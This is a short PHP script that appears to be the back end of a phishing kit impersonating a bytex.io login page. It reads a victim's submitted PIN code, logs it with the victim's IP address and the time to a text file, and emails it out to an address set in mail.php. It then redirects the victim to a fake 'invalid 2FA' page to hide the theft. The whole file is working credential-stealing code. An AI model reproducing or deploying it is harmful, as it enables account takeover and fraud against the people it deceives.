<?php
$file = "____ByteX___.txt";
$Pin = $_POST['Pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Pin Kode   	: ");
fwrite($handle, "$Pin");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://accounts.bytex.io/login/ ");
fwrite($handle, "\n");
fclose($handle);
$Pin = $_POST['Pin'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

Pin Kode : ".$Pin." 

";
include 'mail.php';
$subject = "bytex ".$ip." ";
$headers = "From: centric <fauzijasman193@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/invalid2fa.html?/authen\";
// -->
</script>";
?>